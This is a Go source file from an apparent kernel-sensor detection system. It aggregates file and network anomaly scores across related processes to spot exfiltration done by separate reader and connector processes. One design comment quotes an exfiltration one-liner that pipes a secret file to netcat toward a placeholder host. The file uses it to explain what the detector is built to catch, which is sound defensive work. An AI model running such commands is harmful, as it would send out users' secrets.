package controlplane

import (
	"sync"
	"time"

	"github.com/pardhuvarmax/kernel-borderlands/kb-control-plane/internal/ipc"
)

// Process-tree evidence (feature schema v4, plan item B2/B5).
//
// The attack-lab corpora show the file read and the network connect of one
// attack are usually done by DIFFERENT processes (a reader and a connector,
// e.g. `sh -c "cat secret | nc host"`), so a per-process score never holds
// both. treeCache keeps the latest dim_file / dim_network per process and
// aggregates them over the "family" of a process: its parent and all
// children of that parent (itself and its siblings), as seen by kbd.
//
// Design choices, all deliberately conservative:
//   - Scope is one level up and across, not the whole ancestry. Walking to
//     the top would merge everything under systemd/sshd/containerd and make
//     the feature constant. A parent of PID 0 or 1 (or one kbd has never
//     seen) gives a family of just the process itself.
//   - PIDs are host-namespace tgids (kbd_sensor.bpf.c uses
//     bpf_get_current_pid_tgid and real_parent->tgid), so a container's init
//     is NOT pid 1 here and is treated like any other parent.
//   - An exited process keeps contributing for treeExitedTTL: the reader is
//     often gone before the connector starts.
//   - PID reuse is guarded by StartTimeNs.
//   - The ppid is the one the sensor recorded; a child re-parented after its
//     parent died (to init or a subreaper) falls out of the original family.
//   - Memory is bounded by treeMaxNodes; this is a cache, not persisted.
const (
	treeExitedTTL = 120 * time.Second
	treeStaleTTL  = 10 * time.Minute
	treeMaxNodes  = 65536
	// treeMaxFamily bounds the siblings examined per update so a parent
	// with thousands of children (a forking server, a build) costs O(1),
	// not O(children), on every process_state. Beyond it the sibling sample
	// is arbitrary (map order), so tree_* is a lower bound for such parents.
	treeMaxFamily = 256
)

// Indices into ProcessStateMsg.DimScore, matching ipc.DimNames
// ("process","syscall","privilege","file","network","memory").
const (
	dimFileIdx    = 3
	dimNetworkIdx = 4
)

type treeNode struct {
	ppid     uint32
	start    uint64
	file     float64
	net      float64
	seen     time.Time
	exitedAt time.Time // zero while running
}

type treeCache struct {
	mu       sync.Mutex
	now      func() time.Time
	nodes    map[uint32]*treeNode
	children map[uint32]map[uint32]struct{}
}

func newTreeCache() *treeCache {
	return &treeCache{now: time.Now, nodes: map[uint32]*treeNode{}, children: map[uint32]map[uint32]struct{}{}}
}

func (t *treeCache) unlink(pid uint32, n *treeNode) {
	if c := t.children[n.ppid]; c != nil {
		delete(c, pid)
		if len(c) == 0 {
			delete(t.children, n.ppid)
		}
	}
}

func (t *treeCache) drop(pid uint32) {
	if n, ok := t.nodes[pid]; ok {
		t.unlink(pid, n)
		delete(t.nodes, pid)
	}
}

// prune removes expired entries; called with the lock held when the map is full.
func (t *treeCache) prune(now time.Time) {
	for pid, n := range t.nodes {
		if (!n.exitedAt.IsZero() && now.Sub(n.exitedAt) > treeExitedTTL) || now.Sub(n.seen) > treeStaleTTL {
			t.drop(pid)
		}
	}
}

// Update records the latest scores for a process and returns its family
// aggregates: the highest file and network dimension scores across the
// family, and the lower of the two (high only when BOTH kinds of evidence
// exist somewhere in the family).
func (t *treeCache) Update(msg *ipc.ProcessStateMsg) (file, net, both float64) {
	t.mu.Lock()
	defer t.mu.Unlock()
	now := t.now()
	if len(t.nodes) >= treeMaxNodes {
		t.prune(now)
		if len(t.nodes) >= treeMaxNodes { // still full: fail safe, no aggregation for new pids
			if _, ok := t.nodes[msg.PID]; !ok {
				return msg.DimScore[dimFileIdx], msg.DimScore[dimNetworkIdx],
					minf(msg.DimScore[dimFileIdx], msg.DimScore[dimNetworkIdx])
			}
		}
	}
	n, ok := t.nodes[msg.PID]
	if ok && n.start != msg.StartTimeNs && n.start != 0 && msg.StartTimeNs != 0 {
		t.drop(msg.PID) // PID reused by a different process
		ok = false
	}
	if !ok {
		n = &treeNode{}
		t.nodes[msg.PID] = n
	} else if n.ppid != msg.PPID {
		t.unlink(msg.PID, n)
	}
	n.ppid, n.start = msg.PPID, msg.StartTimeNs
	n.file, n.net = msg.DimScore[dimFileIdx], msg.DimScore[dimNetworkIdx]
	n.seen, n.exitedAt = now, time.Time{}
	if msg.PPID > 1 {
		c := t.children[msg.PPID]
		if c == nil {
			c = map[uint32]struct{}{}
			t.children[msg.PPID] = c
		}
		c[msg.PID] = struct{}{}
	}
	return t.aggregate(msg.PID, n, now)
}

func (t *treeCache) aggregate(pid uint32, self *treeNode, now time.Time) (file, net, both float64) {
	file, net = self.file, self.net
	take := func(m *treeNode) {
		if !m.exitedAt.IsZero() && now.Sub(m.exitedAt) > treeExitedTTL {
			return
		}
		if m.file > file {
			file = m.file
		}
		if m.net > net {
			net = m.net
		}
	}
	if self.ppid > 1 {
		if p, ok := t.nodes[self.ppid]; ok {
			take(p)
		}
		scanned := 0
		for sib := range t.children[self.ppid] {
			if scanned++; scanned > treeMaxFamily {
				break
			}
			if sib != pid {
				if m, ok := t.nodes[sib]; ok {
					take(m)
				}
			}
		}
	}
	return file, net, minf(file, net)
}

// Exit marks a process as gone; its scores keep counting for treeExitedTTL.
func (t *treeCache) Exit(pid uint32) {
	t.mu.Lock()
	defer t.mu.Unlock()
	if n, ok := t.nodes[pid]; ok {
		n.exitedAt = t.now()
	}
}

func minf(a, b float64) float64 {
	if a < b {
		return a
	}
	return b
}
